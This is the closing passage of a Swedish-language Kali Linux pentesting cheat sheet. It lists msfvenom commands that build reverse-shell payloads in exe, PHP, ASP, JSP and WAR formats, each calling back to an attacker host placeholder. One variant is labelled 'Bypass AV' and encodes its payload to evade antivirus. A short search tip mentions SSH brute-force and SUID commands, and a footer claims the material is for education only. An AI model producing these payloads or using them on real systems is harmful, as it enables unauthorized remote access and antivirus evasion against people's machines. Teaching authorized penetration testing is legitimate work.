msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f exe > shell.exe

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI-IP LPORT=4444 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI-IP LPORT=4444 -f war > shell.war

# ENCODED (Bypass AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

---

## 📖 Snabbsökning

**Använd Ctrl+F (Cmd+F) för att snabbt hitta kommandon i denna cheat sheet!**

**Exempel:**
- Sök "suid" → Hitta alla SUID-relaterade kommandon
- Sök "hydra ssh" → SSH brute-force
- Sök "reverse shell" → Alla reverse shell metoder

---

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md)

---

**📅 Senast uppdaterad:** 2025-01-18
**✍️ Författare:** Victory Redovisning Kali Linux Guide Project
**📄 Licens:** Endast för utbildningsändamål

---

**📋 "A good pentester always has their cheat sheets ready."**
